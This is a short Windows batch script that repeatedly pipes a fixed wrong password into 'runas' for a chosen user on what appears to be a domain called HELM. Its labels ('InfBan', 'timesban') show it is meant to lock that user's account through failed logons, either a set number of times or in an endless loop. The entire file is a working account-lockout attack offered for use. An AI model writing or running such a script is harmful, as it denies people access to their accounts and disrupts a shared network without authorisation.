@echo off
color a
set /a baner=0
IF "%optional%" NEQ "" set /a bantimes=%optional%
cls
IF "%mode%" EQU "/i" goto InfBan
IF "%mode%" EQU "/t" goto timesban
:main
echo imlitteralyjustherelol|runas /user:HELM\%target% D:\uhr\f.tfd
set /a baner=%baner%+1
IF "%baner%" EQU "4" goto stoper
goto main
:InfBan
echo imlitteralyjustherelol|runas /user:HELM\%target% D:\uhr\f.tfd
goto InfBan
:timesban
echo imlitteralyjustherelol|runas /user:HELM\%target% D:\uhr\f.tfd
set /a baner=%baner%+1
IF "%baner%" EQU "%bantimes%" goto stoper
goto timesban
:stoper